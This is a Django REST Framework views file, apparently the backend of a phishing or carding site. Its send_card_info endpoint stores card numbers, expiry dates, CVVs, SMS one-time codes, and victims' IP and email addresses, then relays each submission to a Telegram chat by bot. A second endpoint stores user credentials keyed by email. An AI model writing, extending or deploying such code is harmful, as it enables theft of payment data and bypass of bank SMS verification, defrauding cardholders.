from rest_framework import status
from rest_framework.response import Response
from rest_framework.decorators import api_view
from .models import CardInfo, UserCredentials
from .serializers import CardInfoSerializer, UserCredentialsSerializer
import telebot
import os

# Получите ваш Telegram bot token из среды окружения или замените его напрямую
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

bot = telebot.TeleBot(token=TELEGRAM_BOT_TOKEN)

@api_view(['POST'])
def send_card_info(request):
    card_number = request.data.get('card_number')
    if not card_number:
        return Response({'error': 'Card number is required'}, status=status.HTTP_400_BAD_REQUEST)

    card_info = CardInfo.objects.filter(card_number=card_number).first()
    if card_info:
        serializer = CardInfoSerializer(card_info, data=request.data)
    else:
        serializer = CardInfoSerializer(data=request.data)

    if serializer.is_valid():
        card_info = serializer.save()
        message = (
            f"*ID:* `#{card_info.id}`\n"
            f"*IP:* `{card_info.user_ip}`\n" 
            f"*EMAIL:* `{card_info.email}`\n" 
            f"*INFO:* ```{card_info.delivery}```\n" 
            "--------------------\n"
            f"*Card Number:* `{card_info.card_number}`\n"
            f"*Expiry Date:* `{card_info.expiry_date}`\n"
            f"*CVV:* `{card_info.cvv}`\n"
           "--------------------\n"
            f"*SMS_CODE:* `{card_info.sms_code}`" if card_info.sms_code else "*SMS_CODE:* ---"
            
        )
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='Markdown')
        return Response({'message': 'Card info saved and sent to Telegram'}, status=status.HTTP_201_CREATED)
    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
def save_user_credentials(request):
    email = request.data.get('email')
    if not email:
        return Response({'error': 'Email is required'}, status=status.HTTP_400_BAD_REQUEST)

    user_credentials = UserCredentials.objects.filter(email=email).first()
    if user_credentials:
        serializer = UserCredentialsSerializer(user_credentials, data=request.data)
    else:
        serializer = UserCredentialsSerializer(data=request.data)

    if serializer.is_valid():
        serializer.save()
        return Response({'message': 'User credentials saved or updated'}, status=status.HTTP_201_CREATED)
    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
